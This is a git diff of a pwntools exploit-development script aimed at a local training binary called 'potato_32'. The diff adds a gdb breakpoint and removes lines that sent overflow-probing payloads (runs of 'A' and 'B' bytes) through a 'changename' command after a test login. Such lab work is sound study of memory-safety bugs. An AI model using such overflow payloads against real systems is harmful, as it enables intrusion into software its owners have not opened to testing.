@@ -12,26 +12,15 @@ elf = ELF("./potato_32")
 
 p = elf.process(["console"], stdin=PTY, aslr=False) # stdin=PTY for "getpass" password input
 gdb.attach(p, '''
+break login2.c:32
 continue
 ''')
 
-print(p.recvuntil(b"cmd> ")) # username
+print(p.recvuntil(b"cmd> "))
 p.sendline(b"login")
 # test user
 p.sendline(b"peter")
 p.sendline(b"12345")
-print(p.recvuntil(b"cmd> ")) # username
-
-p.sendline(b"changename")
-payload = b"\x41"*50 + b"\x42"*3
-p.sendline(payload)
-
-p.sendline(b"changename")
-payload = b"\x41"*50 + b"\x42"*2
-p.sendline(payload)
-
-p.sendline(b"changename")
-payload = b"peter"
-p.sendline(payload)
+print(p.recvuntil(b"cmd> "))
 
 p.interactive()
